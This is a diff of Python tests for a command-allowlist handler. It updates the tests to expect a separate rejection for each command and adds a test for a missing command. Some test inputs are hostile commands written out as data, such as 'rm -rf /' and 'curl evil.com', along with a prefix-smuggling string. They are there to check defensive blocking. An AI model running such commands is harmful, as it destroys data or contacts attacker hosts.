@@ -35,14 +35,20 @@ def test_allowed_command_passes():
 
 def test_rejected_command_blocked():
     result = json.loads(omh_evidence_handler({"commands": ["rm -rf /"]}))
-    assert "error" in result
-    assert "rm -rf /" in result["rejected"]
+    assert result["all_pass"] is False
+    assert len(result["results"]) == 1
+    assert result["results"][0]["passed"] is False
+    assert "not in allowlist" in result["results"][0]["output"]
 
 
 def test_mixed_allowlist_blocks_all():
+    # With per-command rejection, "echo hi" should succeed and "curl evil.com" should fail
     result = json.loads(omh_evidence_handler({"commands": ["echo hi", "curl evil.com"]}))
-    assert "error" in result
-    assert "curl evil.com" in result["rejected"]
+    assert result["all_pass"] is False
+    assert len(result["results"]) == 2
+    assert result["results"][0]["passed"] is True  # echo hi succeeds
+    assert result["results"][1]["passed"] is False  # curl evil.com fails allowlist
+    assert "not in allowlist" in result["results"][1]["output"]
 
 
 # ---------------------------------------------------------------------------
@@ -136,8 +142,10 @@ def test_pipe_injection_blocked():
 def test_partial_word_prefix_blocked():
     # Token-level check: "pytestmalicious" != "pytest" so this must be rejected.
     result = json.loads(omh_evidence_handler({"commands": ["python -m pytestmalicious"]}))
-    assert "error" in result
-    assert "python -m pytestmalicious" in result["rejected"]
+    assert result["all_pass"] is False
+    assert len(result["results"]) == 1
+    assert result["results"][0]["passed"] is False
+    assert "not in allowlist" in result["results"][0]["output"]
 
 
 def test_clean_command_not_blocked_by_metachar_check():
@@ -206,3 +214,19 @@ def test_truncate_capped_at_max():
     assert "error" not in result
     # Output should be present (not truncated to absurdly small value)
     assert result["results"][0]["output"]
+
+
+# ---------------------------------------------------------------------------
+# FileNotFoundError handling
+# ---------------------------------------------------------------------------
+
+def test_file_not_found_error():
+    # Add a nonexistent command to allowlist, then verify proper error handling
+    omh_config_module._config_cache["evidence"]["allowlist_prefixes"].append("nonexistent-cmd")
+    result = json.loads(omh_evidence_handler({"commands": ["nonexistent-cmd --version"]}))
+    assert result["all_pass"] is False
+    assert len(result["results"]) == 1
+    r = result["results"][0]
+    assert r["passed"] is False
+    assert "Command not found" in r["output"]
+    assert "nonexistent-cmd" in r["output"]
